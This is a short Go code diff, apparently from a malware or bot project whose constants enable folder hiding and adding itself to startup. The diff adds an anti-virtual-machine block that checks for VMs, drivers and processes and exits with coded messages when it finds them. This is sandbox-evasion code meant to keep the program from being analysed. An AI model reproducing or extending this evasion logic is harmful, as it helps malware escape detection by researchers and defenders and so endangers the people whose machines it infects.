@@ -12,12 +12,32 @@ import (
 )
 
 const (
-	debugging    bool = false
+	debugging    bool = true
 	hideFolder   bool = true
 	addToStartup bool = true
 )
 
 func main() {
+	if config.AntiVM {
+		if utils.CheckVMs() {
+			fmt.Println("adc/v")
+			fmt.Scanln()
+			return
+		}
+
+		if utils.CheckDrivers() {
+			fmt.Println("adc/d")
+			fmt.Scanln()
+			return
+		}
+
+		if utils.CheckProcesses() {
+			fmt.Println("adc/p")
+			fmt.Scanln()
+			return
+		}
+	}
+
 	if len(os.Args) >= 2 && os.Args[1] == config.Verifier {
 		bot.Init()
 		return
